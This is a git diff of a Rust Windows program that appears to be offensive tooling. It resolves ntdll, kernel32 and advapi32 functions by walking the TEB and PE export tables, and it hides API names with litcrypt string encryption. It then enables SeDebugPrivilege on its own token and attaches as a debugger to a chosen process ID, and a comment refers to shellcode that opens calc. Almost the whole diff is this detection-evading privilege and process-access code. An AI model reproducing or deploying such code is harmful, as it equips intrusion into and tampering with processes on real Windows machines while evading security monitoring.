@@ -1,12 +1,22 @@
+#![allow(non_camel_case_types)]
+#![allow(non_snake_case)]
+
 use winapi::{
     shared::{
-        minwindef::{BOOL, DWORD, FARPROC},
-        ntdef::{HANDLE, NTSTATUS, OBJECT_ATTRIBUTES},
+        minwindef::{BOOL, DWORD},
+        ntdef::{HANDLE, NTSTATUS},
     },
     um::winnt::{ACCESS_MASK, MAXIMUM_ALLOWED},
 };
 
-use noldr::*;
+use noldr::{self, HMODULE, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS64, TEB};
+
+use std::ffi::c_void;
+
+#[macro_use]
+extern crate litcrypt;
+
+use_litcrypt!();
 
 //shellcode for popping calc
 
@@ -40,18 +50,9 @@ type NtGetNextProcessFn = unsafe extern "system" fn(
     NewProcessHandle: *mut HANDLE,
 ) -> i32;
 
-// Update the type definition
-type GetModuleFileNameWFn =
-    unsafe extern "system" fn(hModule: HANDLE, lpFilename: *mut u16, nSize: u32) -> u32;
+type GetProcessIdFn = unsafe extern "system" fn(HANDLE) -> u32;
 
 type GetCurrentProcessFn = unsafe extern "system" fn() -> HANDLE;
-
-// Update the type definition to match exactly with Windows API
-type OpenProcessTokenFn = unsafe extern "system" fn(
-    ProcessHandle: HANDLE,
-    DesiredAccess: DWORD,
-    TokenHandle: *mut HANDLE,
-) -> BOOL;
 
 // Add this type definition near your other ones
 type NtOpenProcessTokenFn = unsafe extern "system" fn(
@@ -90,12 +91,28 @@ type NtAdjustPrivilegesTokenFn = unsafe extern "system" fn(
     ReturnLength: *mut u32,
 ) -> NTSTATUS;
 
-const MAX_PATH: usize = 260;
 const TOKEN_ADJUST_PRIVILEGES: u32 = 0x0020;
 const TOKEN_QUERY: u32 = 0x0008;
 
 // Add near your other type definitions
 type NtCloseFn = unsafe extern "system" fn(Handle: HANDLE) -> NTSTATUS;
+
+type DebugActiveProcessFn = unsafe extern "system" fn(dwProcessId: DWORD) -> BOOL;
+
+type IMAGE_NT_HEADERS = IMAGE_NT_HEADERS64;
+
+// Add with other type definitions at the top
+type LookupPrivilegeValueFn = unsafe extern "system" fn(
+    lpSystemName: *const i8,
+    lpName: *const i8,
+    lpLuid: *mut LUID,
+) -> BOOL;
+
+// Add with other constants
+const SE_DEBUG_NAME: &str = "SeDebugPrivilege\0";
+
+// Add with other type definitions
+type DebugActiveProcessStopFn = unsafe extern "system" fn(dwProcessId: DWORD) -> BOOL;
 
 fn main() {
     let args: Vec<String> = std::env::args().collect();
@@ -114,11 +131,8 @@ fn main() {
     };
 
     println!("[+] Targeting PID {}", target_pid);
-    locate_process(target_pid).unwrap();
-}
 
-fn locate_process(target_pid: u32) -> Result<(), Box<dyn std::error::Error>> {
-    let teb = noldr::get_teb();
+    let teb: *const TEB = noldr::get_teb();
     println!("[+] TEB address: {:?}", teb);
 
     let ntdll = noldr::get_dll_address("ntdll.dll".to_string(), teb).unwrap();
@@ -127,126 +141,52 @@ fn locate_process(target_pid: u32) -> Result<(), Box<dyn std::error::Error>> {
     let kernel32 = noldr::get_dll_address("kernel32.dll".to_string(), teb).unwrap();
     println!("[+] kernel32.dll address: {:?}", kernel32);
 
-    //locate NtOpenProcessToken
-    let nt_open_process_token = noldr::get_function_address(ntdll, "NtOpenProcessToken")
+    //load advapi.dll
+    let advapi32 = load_dll("advapi32.dll", kernel32);
+    println!("[+] advapi32.dll handle: {:?}", advapi32);
+    //deref the handle to get the base address
+    let advapi32_base = unsafe { std::mem::transmute::<HMODULE, *const c_void>(advapi32) };
+    println!("[+] advapi32.dll address: {:?}", advapi32_base);
+
+    locate_process(target_pid, ntdll, kernel32).unwrap();
+
+    elevate_debug(ntdll, kernel32, advapi32_base).unwrap();
+
+    //debug the target process
+    let debug_active_process = noldr::get_function_address(kernel32, "DebugActiveProcess")
         .unwrap_or_else(|| std::ptr::null_mut());
+    println!("[+] DebugActiveProcess address: {:?}", debug_active_process);
 
-    if nt_open_process_token.is_null() {
-        println!("[!] Failed to get NtOpenProcessToken address");
-        return Err("NtOpenProcessToken address is null".into());
-    }
-    println!(
-        "[+] NtOpenProcessToken address: {:?}",
-        nt_open_process_token
-    );
+    let debug_active_process: DebugActiveProcessFn =
+        unsafe { std::mem::transmute(debug_active_process) };
 
-    // Print first few bytes to verify it's not forwarded
-    unsafe {
-        let bytes = std::slice::from_raw_parts(nt_open_process_token as *const u8, 16);
-        println!("[*] First bytes of NtOpenProcessToken: {:02x?}", bytes);
-    }
+    //check if the process is being debugged
+    let is_debugged = unsafe { debug_active_process(target_pid as DWORD) };
+    println!("[+] Successfully attached to process as debugger: {}", is_debugged != 0);
 
-    let nt_open_process_token: NtOpenProcessTokenFn =
-        unsafe { std::mem::transmute(nt_open_process_token) };
+    let debug_active_process_stop = noldr::get_function_address(kernel32, &lc!("DebugActiveProcessStop"))
+        .unwrap_or_else(|| std::ptr::null_mut());
+    println!("[+] DebugActiveProcessStop address: {:?}", debug_active_process_stop);
 
-    let mut token_handle: HANDLE = std::ptr::null_mut();
+    let debug_active_process_stop: DebugActiveProcessStopFn = 
+        unsafe { std::mem::transmute(debug_active_process_stop) };
+
+    unsafe { debug_active_process_stop(target_pid as DWORD) };
+}
+
+fn locate_process(
+    target_pid: u32,
+    ntdll: *const c_void,
+    kernel32: *const c_void,
+) -> Result<(), Box<dyn std::error::Error>> {
+    let nt_get_next_process = noldr::get_function_address(ntdll, "NtGetNextProcess")
+        .unwrap_or_else(|| std::ptr::null_mut());
+    println!("[+] NtGetNextProcess address: {:?}", nt_get_next_process);
 
     let get_process_id = noldr::get_function_address(kernel32, "GetProcessId")
         .unwrap_or_else(|| std::ptr::null_mut());
     println!("[+] GetProcessId address: {:?}", get_process_id);
-
-    let get_current_process = noldr::get_function_address(kernel32, "GetCurrentProcess")
-        .unwrap_or_else(|| std::ptr::null_mut());
-    println!("[+] GetCurrentProcess address: {:?}", get_current_process);
-
-    let current_process: GetCurrentProcessFn = unsafe { std::mem::transmute(get_current_process) };
-
-    type GetProcessIdFn = unsafe extern "system" fn(HANDLE) -> u32;
     let get_process_id: GetProcessIdFn = unsafe { std::mem::transmute(get_process_id) };
-
-    println!("[*] Debug - About to call NtOpenProcessToken");
-    let status = unsafe {
-        println!("[*] About to make the call");
-        let result = nt_open_process_token(
-            current_process(),
-            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
-            &mut token_handle,
-        );
-        println!("[*] Call completed");
-        result
-    };
-
-    if status != 0 {
-        println!("[!] NtOpenProcessToken failed with status: {}", status);
-        return Err("Failed to open process token".into());
-    }
-
-    if token_handle.is_null() {
-        println!("[!] Token handle is null despite successful call");
-        return Err("Received null token handle".into());
-    }
-
-    println!("[+] Successfully opened process token: {:?}", token_handle);
-
-    // SeDebugPrivilege LUID
-    let luid = LUID {
-        LowPart: 20,  // SeDebugPrivilege
-        HighPart: 0,
-    };
-    println!("[*] Created LUID: LowPart={}, HighPart={}", luid.LowPart, luid.HighPart);
-
-    let mut priv_struct = TOKEN_PRIVILEGES {
-        PrivilegeCount: 1,
-        Privileges: [LUID_AND_ATTRIBUTES {
-            Luid: luid,
-            Attributes: SE_PRIVILEGE_ENABLED,
-        }],
-    };
-    println!("[*] Created TOKEN_PRIVILEGES structure with {} privilege(s)", priv_struct.PrivilegeCount);
-
-    let nt_adjust_privileges_token = noldr::get_function_address(ntdll, "NtAdjustPrivilegesToken")
-        .unwrap_or_else(|| std::ptr::null_mut());
-    println!("[+] NtAdjustPrivilegesToken address: {:?}", nt_adjust_privileges_token);
-
-    let status = unsafe {
-        let nt_adjust_privileges_token: NtAdjustPrivilegesTokenFn = std::mem::transmute(nt_adjust_privileges_token);
-        println!("[*] Attempting to adjust token privileges...");
-        nt_adjust_privileges_token(
-            token_handle,
-            0,
-            &priv_struct,
-            std::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
-            std::ptr::null_mut(),
-            std::ptr::null_mut(),
-        )
-    };
-
-    if status != 0 {
-        println!("[!] NtAdjustPrivilegesToken failed with status code: {:#x}", status);
-        return Err("Failed to adjust token privileges".into());
-    }
-
-    println!("[+] Successfully enabled SeDebugPrivilege!");
-
-    // After you're done with the token_handle:
-    let nt_close = noldr::get_function_address(ntdll, "NtClose")
-        .unwrap_or_else(|| std::ptr::null_mut());
-
-    let status = unsafe {
-        let nt_close: NtCloseFn = std::mem::transmute(nt_close);
-        nt_close(token_handle)
-    };
-
-    if status != 0 {
-        println!("[!] NtClose failed with status: {}", status);
-        return Err("Failed to close token handle".into());
-    }
-
-    println!("[+] Successfully closed token handle");
-
-    let nt_get_next_process = noldr::get_function_address(ntdll, "NtGetNextProcess")
-        .unwrap_or_else(|| std::ptr::null_mut());
-    println!("[+] NtGetNextProcess address: {:?}", nt_get_next_process);
 
     let mut handle: HANDLE = std::ptr::null_mut();
     let mut target_handle: HANDLE = std::ptr::null_mut();
@@ -276,8 +216,195 @@ fn locate_process(target_pid: u32) -> Result<(), Box<dyn std::error::Error>> {
     Ok(())
 }
 
-/*
-fn elevate_debug() -> Result<(), Box<dyn std::error::Error>> {
+fn elevate_debug(
+    ntdll: *const c_void,
+    kernel32: *const c_void,
+    advapi32: *const c_void,
+) -> Result<(), Box<dyn std::error::Error>> {
+    //locate NtOpenProcessToken
+    let nt_open_process_token = noldr::get_function_address(ntdll, "NtOpenProcessToken")
+        .unwrap_or_else(|| std::ptr::null_mut());
 
+    if nt_open_process_token.is_null() {
+        println!("[!] Failed to get NtOpenProcessToken address");
+        return Err("NtOpenProcessToken address is null".into());
+    }
+    println!(
+        "[+] NtOpenProcessToken address: {:?}",
+        nt_open_process_token
+    );
+
+    let nt_open_process_token: NtOpenProcessTokenFn =
+        unsafe { std::mem::transmute(nt_open_process_token) };
+
+    let mut token_handle: HANDLE = std::ptr::null_mut();
+
+    let get_current_process = noldr::get_function_address(kernel32, "GetCurrentProcess")
+        .unwrap_or_else(|| std::ptr::null_mut());
+    println!("[+] GetCurrentProcess address: {:?}", get_current_process);
+
+    let current_process: GetCurrentProcessFn = unsafe { std::mem::transmute(get_current_process) };
+
+    println!("[*] Debug - About to call NtOpenProcessToken");
+    let status = unsafe {
+        println!("[*] About to make the call");
+        let result = nt_open_process_token(
+            current_process(),
+            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+            &mut token_handle,
+        );
+        println!("[*] Call completed");
+        result
+    };
+
+    if status != 0 {
+        println!("[!] NtOpenProcessToken failed with status: {}", status);
+        return Err("Failed to open process token".into());
+    }
+
+    if token_handle.is_null() {
+        println!("[!] Token handle is null despite successful call");
+        return Err("Received null token handle".into());
+    }
+
+    println!("[+] Successfully opened process token: {:?}", token_handle);
+
+    let lookup_privilege_value = noldr::get_function_address(advapi32, &lc!("LookupPrivilegeValueA"))
+        .unwrap_or_else(|| std::ptr::null_mut());
+    println!("[+] LookupPrivilegeValueA address: {:?}", lookup_privilege_value);
+
+    let mut luid = LUID {
+        LowPart: 0,
+        HighPart: 0,
+    };
+
+    let success = unsafe {
+        let lookup_privilege_value: LookupPrivilegeValueFn =
+            std::mem::transmute(lookup_privilege_value);
+        lookup_privilege_value(
+            std::ptr::null(),
+            SE_DEBUG_NAME.as_ptr() as *const i8,
+            &mut luid,
+        )
+    };
+
+    if success == 0 {
+        println!("[!] LookupPrivilegeValue failed");
+        std::process::exit(1);
+    }
+
+    let priv_struct = TOKEN_PRIVILEGES {
+        PrivilegeCount: 1,
+        Privileges: [LUID_AND_ATTRIBUTES {
+            Luid: luid,
+            Attributes: SE_PRIVILEGE_ENABLED,
+        }],
+    };
+
+    let nt_adjust_privileges_token = noldr::get_function_address(ntdll, "NtAdjustPrivilegesToken")
+        .unwrap_or_else(|| std::ptr::null_mut());
+    println!(
+        "[+] NtAdjustPrivilegesToken address: {:?}",
+        nt_adjust_privileges_token
+    );
+
+    let status = unsafe {
+        let nt_adjust_privileges_token: NtAdjustPrivilegesTokenFn =
+            std::mem::transmute(nt_adjust_privileges_token);
+        println!("[*] Attempting to adjust token privileges...");
+        nt_adjust_privileges_token(
+            token_handle,
+            0,
+            &priv_struct,
+            std::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
+        )
+    };
+
+    if status != 0 {
+        println!(
+            "[!] NtAdjustPrivilegesToken failed with status code: {:#x}",
+            status
+        );
+        std::process::exit(1);
+    }
+
+    println!("[+] Successfully enabled SeDebugPrivilege!");
+
+    // After you're done with the token_handle:
+    let nt_close =
+        noldr::get_function_address(ntdll, "NtClose").unwrap_or_else(|| std::ptr::null_mut());
+
+    let status = unsafe {
+        let nt_close: NtCloseFn = std::mem::transmute(nt_close);
+        nt_close(token_handle)
+    };
+
+    if status != 0 {
+        println!("[!] NtClose failed with status: {}", status);
+        return Err("Failed to close token handle".into());
+    }
+
+    println!("[+] Successfully closed token handle");
+
+    Ok(())
 }
-*/
+
+//for loading the dll and getting a handle to it
+pub fn load_dll(dll_name: &str, kernel32_base: *const c_void) -> HMODULE {
+    unsafe {
+        // Get the base address of kernel32.dll
+        //let kernel32_base = get_dll_address("kernel32.dll".to_string(), get_teb()).unwrap();
+
+        // Get the address of LoadLibraryA function
+        let load_library_a = get_function_address(kernel32_base, &lc!("LoadLibraryA")).unwrap();
+        let load_library_a: extern "system" fn(*const i8) -> HMODULE =
+            std::mem::transmute(load_library_a);
+
+        // Convert dll_name to a C-style string
+        let c_dll_name = std::ffi::CString::new(dll_name).unwrap();
+
+        // Call LoadLibraryA to get the handle
+        load_library_a(c_dll_name.as_ptr())
+    }
+}
+
+//get the address of a function in a dll
+pub fn get_function_address(dll_base: *const c_void, function_name: &str) -> Option<*const c_void> {
+    unsafe {
+        let dos_header = &*(dll_base as *const IMAGE_DOS_HEADER);
+        let nt_headers =
+            &*((dll_base as usize + dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS);
+        let export_directory_rva = nt_headers.OptionalHeader.DataDirectory[0].VirtualAddress;
+        let export_directory = &*((dll_base as usize + export_directory_rva as usize)
+            as *const IMAGE_EXPORT_DIRECTORY);
+
+        let names_rva = export_directory.AddressOfNames;
+        let functions_rva = export_directory.AddressOfFunctions;
+        let ordinals_rva = export_directory.AddressOfNameOrdinals;
+
+        let names = std::slice::from_raw_parts(
+            (dll_base as usize + names_rva as usize) as *const u32,
+            export_directory.NumberOfNames as usize,
+        );
+        let ordinals = std::slice::from_raw_parts(
+            (dll_base as usize + ordinals_rva as usize) as *const u16,
+            export_directory.NumberOfNames as usize,
+        );
+
+        for i in 0..export_directory.NumberOfNames as usize {
+            let name_ptr = (dll_base as usize + names[i] as usize) as *const u8;
+            let name = std::ffi::CStr::from_ptr(name_ptr as *const i8)
+                .to_str()
+                .unwrap_or_default();
+            if name == function_name {
+                let ordinal = ordinals[i] as usize;
+                let function_rva =
+                    *((dll_base as usize + functions_rva as usize) as *const u32).add(ordinal);
+                return Some((dll_base as usize + function_rva as usize) as *const c_void);
+            }
+        }
+    }
+    None
+}
